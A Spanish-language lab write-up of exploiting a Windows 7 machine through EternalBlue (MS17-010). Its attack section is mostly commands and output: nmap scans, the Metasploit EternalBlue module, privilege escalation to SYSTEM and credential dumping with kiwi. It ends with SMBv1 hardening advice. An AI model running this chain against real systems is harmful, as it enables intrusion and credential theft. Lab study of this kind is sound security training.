# **Explotación de Máquina Windows via EternalBlue (MS17-010)**

![Dificultad: Fácil](https://img.shields.io/badge/Dificultad-Fácil-brightgreen) ![Servicio: SMB](https://img.shields.io/badge/Servicio-SMBv1-blue) ![CVE: MS17-010](https://img.shields.io/badge/CVE-MS17--010-critical)

## **Descripción Técnica**
Este reporte documenta la explotación de una máquina Windows vulnerable a través de:
1. Vulnerabilidad crítica en SMBv1 (EternalBlue)
2. Acceso no autenticado a recursos compartidos
3. Ejecución remota de código con privilegios de sistema

**Tiempo estimado**: 15-25 minutos  
**Nivel de complejidad**: Básico  
**Sistema operativo**: Windows 7/Server 2008 R2

## **Índice Analítico**
1. [Reconocimiento](#reconocimiento)
2. [Explotación](#explotación)
3. [Post-Explotación](#post-explotación)
4. [Lecciones Aprendidas](#conclusión)

## **Reconocimiento**

### 1. Escaneo Inicial
```bash
nmap -p- -sS -min-rate 5000 --open -Pn -n 10.0.2.9 -oN initial_scan
```
**Resultados clave**:
```
445/tcp open  microsoft-ds Windows 7 Professional 7601 Service Pack 1
```

### 2. Verificación de Vulnerabilidad
```bash
nmap -p445 --script smb-vuln-ms17-010 10.0.2.9 -oN vuln_scan
```
**Salida concluyente**:
```
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
```

## **Explotación**

### 3. Configuración de Metasploit
```bash
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.0.2.9
set LHOST 10.0.2.4
exploit
```
**Indicador de éxito**:
```
[*] Meterpreter session 1 opened
```

## **Post-Explotación**

### 4. Escalada de Privilegios
```meterpreter
getsystem
```
**Verificación**:
```
Current privilege level: SYSTEM
```

### 5. Extracción de Credenciales
```meterpreter
load kiwi
creds_all
```
**Ejemplo de salida**:
```
[+] Harvested credentials
Domain        User        Password
------        ----        --------
WORKGROUP     ADMIN       P@ssw0rd123
```

## **Conclusión**

### Matriz de Riesgos
| Vulnerabilidad | CVSS | Impacto |
|---------------|------|---------|
| MS17-010 | 9.3 | Crítico |
| SMBv1 Habilitado | 8.1 | Alto |
| Credenciales en texto claro | 7.8 | Alto |

### Recomendaciones de Seguridad
1. **Remediación inmediata**:
```powershell
# Deshabilitar SMBv1
Disable-WindowsOptionalFeature -Online -FeatureName smb1protocol
```

2. **Hardening adicional**:
```powershell
# Habilitar SMB Signing
Set-SmbServerConfiguration -RequireSecuritySignature $true
```

> ⚠️ **Aviso Legal**: Este contenido es solo para pruebas de penetración autorizadas. El uso no autorizado es ilegal.

---

**Stack Tecnológico**:
- `nmap` 7.80+
- `metasploit-framework` 6.0+
- `Windows 7` SP1

**Referencias Técnicas**:
1. [Microsoft Security Bulletin MS17-010](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010)
2. [CVE-2017-0143 Details](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143)
3. [NSA EternalBlue Advisory](https://nsacyber.github.io/publications.html)
